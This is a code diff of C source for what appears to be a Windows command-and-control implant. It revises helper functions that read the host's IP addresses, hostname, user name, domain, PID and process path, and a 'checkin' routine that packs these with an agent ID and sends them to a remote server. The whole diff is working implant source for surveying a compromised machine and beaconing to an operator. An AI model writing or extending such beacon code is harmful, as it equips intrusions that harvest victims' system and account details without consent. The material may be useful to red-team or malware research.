@@ -13,7 +13,6 @@ UINT32* getIPAddress(UINT32* numberOfIPs)
 	IN_ADDR IPAddr;
 	LPVOID lpMsgBuf;
 
-
 	pIPAddrTable = (MIB_IPADDRTABLE*)LocalAlloc(LPTR, sizeof(MIB_IPADDRTABLE));
 	if (pIPAddrTable)
 	{
@@ -28,7 +27,6 @@ UINT32* getIPAddress(UINT32* numberOfIPs)
 
 	else
 		return NULL;
-
 
 	if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR)
 		return NULL;
@@ -75,7 +73,6 @@ PCHAR getHostname()
 	{
 		if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
 		{
-			memset((PBYTE)data, 0, dataLen);
 			GetComputerNameExA(ComputerNameNetBIOS, data, &dataLen);
 			hostnameRep = data;
 		}
@@ -93,7 +90,6 @@ char* getUserName()
 	{
 		if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
 		{
-			memset(data, 0, dataLen);
 			GetUserNameA(data, &dataLen);
 			userName = data;
 		}
@@ -124,7 +120,6 @@ LPWSTR getDomain()
 // Getting the current OS Name (not implemented)
 char* getOsName()
 {
-#pragma warning(disable : 4996)
 	return (PCHAR)"Windows";
 }
 
@@ -139,8 +134,7 @@ char* getCurrentProcName()
 		CHAR buffer[1024];
 		if (QueryFullProcessImageNameA(handle, 0, buffer, &buffSize))
 		{
-			processName = (char*)LocalAlloc(LPTR, buffSize);
-			memset((PBYTE)processName + buffSize, 0, 1);
+			processName = (char*)LocalAlloc(LPTR, buffSize + 1);
 			memcpy(processName, buffer, buffSize);
 		}
 		CloseHandle(handle);
@@ -151,23 +145,32 @@ char* getCurrentProcName()
 
 PParser checkin()
 {
-	PPackage checkin = newPackage(0, TRUE);
-	addByte(checkin, 0xf1);
+	UINT32 numberOfIPs = 0;
+
+	PPackage checkin = newPackage(CHECKIN, TRUE);
 	addString(checkin, (PCHAR)ceosConfig->agentID, FALSE);
 
-	UINT32 numberOfIPs = 0;
+	// IP addresses;
 	UINT32* tableOfIPs = getIPAddress(&numberOfIPs);
 	addInt32(checkin, numberOfIPs);
 	for (UINT32 i=0 ; i< numberOfIPs; i++)
 		addInt32(checkin, tableOfIPs[i]);
 	
+	// OS 
 	addString(checkin, getOsName(), TRUE);
+	// Arch
 	addByte(checkin, getArch());
+	// Hostname
 	addString(checkin, getHostname(), TRUE);
+	// Username
 	addString(checkin, getUserName(), TRUE);
+	// Domain
 	addWString(checkin, getDomain(), TRUE);
-	addInt32(checkin, 0);
+	// PID
+	addInt32(checkin, GetCurrentProcessId());
+	// ProcessName
 	addString(checkin, getCurrentProcName(), TRUE);
+	// External IP (useless)
 	addString(checkin, (PCHAR)"1.1.1.1", TRUE);
 
 	Parser* ResponseParser = sendPackage(checkin);
